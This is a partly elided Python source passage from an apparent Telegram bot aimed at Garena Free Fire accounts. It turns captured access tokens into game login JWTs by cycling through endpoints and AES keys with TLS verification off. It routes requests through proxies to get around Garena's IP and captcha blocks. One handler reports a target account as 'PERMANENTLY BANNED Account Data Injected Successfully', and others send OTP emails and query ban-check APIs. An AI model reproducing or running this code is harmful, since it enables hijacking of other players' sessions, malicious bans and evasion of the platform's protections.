...
def fetch_majorlogin_jwt(tok):
    ...
    # Method 1: oauth inspect
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=8, proxies=proxies, verify=False).json()
        oId = r.get("open_id")
    ...
    if not oId:
        try:
            ...
            if uid:
                ...
                print(f"[FFBAN] topup open_id: {oId}")
        except Exception as e:
            print(f"[FFBAN] reward method failed: {e}")
    # Method 3: Direct token as open_id (64 hex)
    if not oId and len(tok) == 64:
        oId = tok
        print(f"[FFBAN] Using token directly as open_id")
    if not oId:
        return None, "Failed to extract Open ID - Token expired or invalid. Try fresh EAT token"
    # Try multiple AES keys and platforms - Subscribe.py exact logic + enhanced
    ...
    # Try with both old and new AES keys
    for url in urls:
        for p_type in platforms:
            try:
                ...
                x = requests.post(url, headers=headers, data=pl, timeout=12, verify=False, proxies=proxies)
                ...
                if x.status_code == 200:
                    ...
                    try:
                        ...
                        try:
                            ...
                            print(f"[FFBAN] Parse failed: {pe}")
                            continue
                    if res.token:
                        print(f"[FFBAN] Success token found!")
                        return res.token, None
                    else:
                        if res.blacklist and res.blacklist.ban_reason:
                            print(f"[FFBAN] Account already banned: {res.blacklist.ban_reason}")
            except Exception as e:
                print(f"[FFBAN] {url} p{p_type} error: {e}")
                continue
    return None, "MajorLogin failed - Garena blocked Railway IP or token expired. Set PROXY_URL in Railway ENV or try fresh token. Same as Subscribe.py logic"
...
async def ff_ban_confirm(update, context):
    ...
    try:
        ...
        if ban_resp and ban_resp.status_code == 200:
            ...
            region = user_data.get('lock_region', user_data.get('region', 'IND'))
            version = user_data.get('release_version', 'Latest')
            txt = f"100% PERMANENTLY BANNED Account Data Injected Successfully Target Name: {nickname} Target UID: {account_id} Target Region: {region} Patch Ver: {version} Status: PERMANENTLY BANNED 100% Edition: RAIZZ EDITION Operation Completed Successfully! @just_zevric Premium Same as Subscribe.py"
    ...
    try:
        ...
        try:
            ...
            if status_code == 200 and result.get("result") == 0:
                await update.message.reply_text(f"OTP Sent Successfully! Check email: {email} Status: {status_code} Response: {json.dumps(result, indent=2)[:200]} @just_zevric Same as Subscribe.py", reply_markup=get_main_keyboard())
            else:
                if status_code == 403:
                    await update.message.reply_text(f"Garena Blocked Server IP! Email: {email} Reason: Railway IP flagged - datadome captcha Solution: Set PROXY_URL or wait 1 hour Status: {status_code} @just_zevric", reply_markup=get_main_keyboard())
                elif status_code == 429:
                    await update.message.reply_text(f"Too Many Requests! Email: {email} Garena says: Wait 5-10 minutes Do not spam OTP Code 1006 Status: {status_code} @just_zevric", reply_markup=get_main_keyboard())
                else:
                    await update.message.reply_text(f"Failed! Email: {email} Status: {status_code} Response: {response[:300]} @just_zevric", reply_markup=get_main_keyboard())
        except:
            if status_code == 403:
                await update.message.reply_text(f"Garena Blocked Server IP! Email: {email} Reason: datadome captcha block Solution: Set PROXY_URL Status: 403 @just_zevric", reply_markup=get_main_keyboard())
            elif status_code == 429:
                await update.message.reply_text(f"Too Many Requests! Email: {email} Wait 5-10 min Status: 429 Code 1006 @just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"Status: {status_code} Response: {response[:300]} @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
    ...
    try:
        def fetch_ban():
            ...
            apis = [
                ...
                f"https://crownx-ban-checker.vercel.app/api/ban?uid={uid}",
                f"https://ff-ban-check.vercel.app/api/check/{uid}",
                f"https://ban-check-api-phi.vercel.app/api/baninfo?uid={uid}"
            ]
            for api_url in apis:
                try:
                    print(f"[BANCHECK] Trying {api_url}")
                    resp = requests.get(api_url, timeout=15, verify=False, proxies=proxies, headers={"User-Agent": "Mozilla/5.0"})
                    print(f"[BANCHECK] {api_url} status {resp.status_code}")
                    if resp.status_code == 200:
                        return resp
                    elif resp.status_code == 410:
                        print(f"[BANCHECK] {api_url} 410 Gone, trying next")
                        continue
                    else:
                        # If 4xx but not 410, try next
                        if resp.status_code >= 400 and resp.status_code < 500 and resp.status_code != 429:
                            continue
                        return resp
                except Exception as e:
                    print(f"[BANCHECK] {api_url} error {e}")
                    continue
            # If all fail, return last attempt with 410
            return requests.get(apis[0], timeout=15, verify=False, proxies=proxies)
        ...
        if response.status_code == 200:
            try:
                data = response.json()
                account_id = data.get('account_id', data.get('uid', uid))
                nickname = data.get('nickname', data.get('name', 'N/A'))
                region = data.get('region', data.get('server', 'N/A'))
                level = data.get('level', data.get('lvl', 'N/A'))
                ban_info = data.get('ban_info', data.get('ban', {}))
                if ban_info and (ban_info.get('is_banned') or ban_info.get('banned')):
                    ban_start = ban_info.get('ban_start_time', ban_info.get('start', 'N/A'))
                    ban_reason = ban_info.get('status', ban_info.get('reason', 'N/A'))
                    txt = f"CROWNX BAN CHECKER Account ID: {account_id} Nickname: {nickname} Region: {region} Level: {level} Ban Status: PERMANENTLY BANNED Start Time: {ban_start} Reason: {ban_reason} @just_zevric Same as Subscribe.py"
                else:
                    # Check if data directly has banned flag
                    is_banned = data.get('is_banned', False) or data.get('banned', False)
                    if is_banned:
                        txt = f"CROWNX BAN CHECKER Account ID: {account_id} Nickname: {nickname} Region: {region} Level: {level} Ban Status: PERMANENTLY BANNED @just_zevric Same as Subscribe.py"
                    else:
                        txt = f"CROWNX BAN CHECKER Account ID: {account_id} Nickname: {nickname} Region: {region} Level: {level} Ban Status: ACCOUNT IS CLEAN (Not Banned) @just_zevric Same as Subscribe.py"
                await update.message.reply_text(txt, reply_markup=get_main_keyboard())
            except Exception as e:
                await update.message.reply_text(f"Ban Info for {uid}: {response.text[:400]} @just_zevric", reply_markup=get_main_keyboard())
        else:
            if response.status_code == 410:
                await update.message.reply_text(f"Ban Check API is down (410 Gone). UID: {uid} API https://crownx-premium-bancheck.vercel.app is removed. Try again later or set PROXY_URL or contact @just_zevric for new API. Status: 410", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"Request Failed! UID: {uid} Status: {response.status_code} Response: {response.text[:200]} Try again later or set PROXY_URL @just_zevric", reply_markup=get_main_keyboard())
    except requests.exceptions.ConnectionError:
        try:
            await processing.delete()
        except:
            pass
        await update.message.reply_text("Connection Error! Please check internet @just_zevric", reply_markup=get_main_keyboard())
    except requests.exceptions.Timeout:
        try:
            await processing.delete()
        except:
            pass
        await update.message.reply_text("Request timed out! Try again later @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        try:
            await processing.delete()
        except:
            pass
        await update.message.reply_text(f"Error: {str(e)} @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END
